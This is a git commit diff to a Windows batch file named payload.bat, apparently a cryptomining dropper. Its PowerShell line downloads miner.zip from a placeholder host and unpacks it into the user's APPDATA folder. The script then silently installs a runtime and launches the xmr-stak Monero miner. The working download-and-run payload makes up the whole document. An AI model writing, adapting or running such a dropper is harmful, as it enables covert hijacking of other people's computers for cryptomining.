69fc02171c59afcc7fc5be83f296a41d523f3304
mrpnkt <mr@mrpnkt.com>
2018-02-16 20:56:45 +0100

    Update payload.bat

--- payload.bat
+++ payload.bat
@@ -1,6 +1,5 @@
 @echo off
-powershell -command "Invoke-WebRequest 'https://website/miner.zip' -OutFile 'miner.zip'"
-powershell -command "Expand-Archive .\miner.zip  -DestinationPath $env:APPDATA"
+powershell -command "Invoke-WebRequest 'https://website/miner.zip' -OutFile 'miner.zip'; Expand-Archive .\miner.zip  -DestinationPath $env:APPDATA"
 cd minero
 .\VC_redist.x64.exe /passive /norestart
 .\xmr-stak.exe
